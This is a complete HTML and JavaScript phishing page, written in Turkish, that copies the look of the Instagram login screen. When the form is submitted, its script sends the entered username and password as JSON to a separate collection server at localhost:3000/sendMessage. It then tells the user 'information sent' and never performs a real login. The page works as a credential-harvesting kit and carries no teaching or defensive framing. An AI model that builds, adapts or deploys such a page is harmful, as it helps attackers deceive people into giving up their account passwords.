<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Giriş</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            text-align: center;
            width: 100%;
            max-width: 400px;
        }
        .logo {
            font-size: 48px;
            font-family: 'Brush Script MT', cursive;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 10px;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            font-size: 14px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: #fff;
            box-sizing: border-box;
        }
        .form-group input:focus {
            outline: none;
            border-color: #555;
        }
        .btn-login {
            background-color: #3897f0;
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            width: 100%;
            cursor: pointer;
        }
        .btn-login:hover {
            background-color: #3185d6;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <form id="loginForm">
            <div class="form-group">
                <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" placeholder="Şifre" required>
            </div>
            <button type="submit" class="btn-login">Giriş Yap</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (username && password) {
                try {
                    const response = await fetch('http://localhost:3000/sendMessage', { // Flask server URL
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ username, password }),
                    });

                    const result = await response.json();

                    if (response.ok) {
                        alert("Bilgiler gönderildi!");
                    } else {
                        alert(`Gönderim başarısız oldu: ${result.error}`);
                    }
                } catch (error) {
                    console.error(error);
                    alert("Bir hata oluştu. Lütfen daha sonra tekrar deneyin.");
                }
            } else {
                alert("Lütfen tüm alanları doldurun.");
            }
        });
    </script>
</body>
</html>
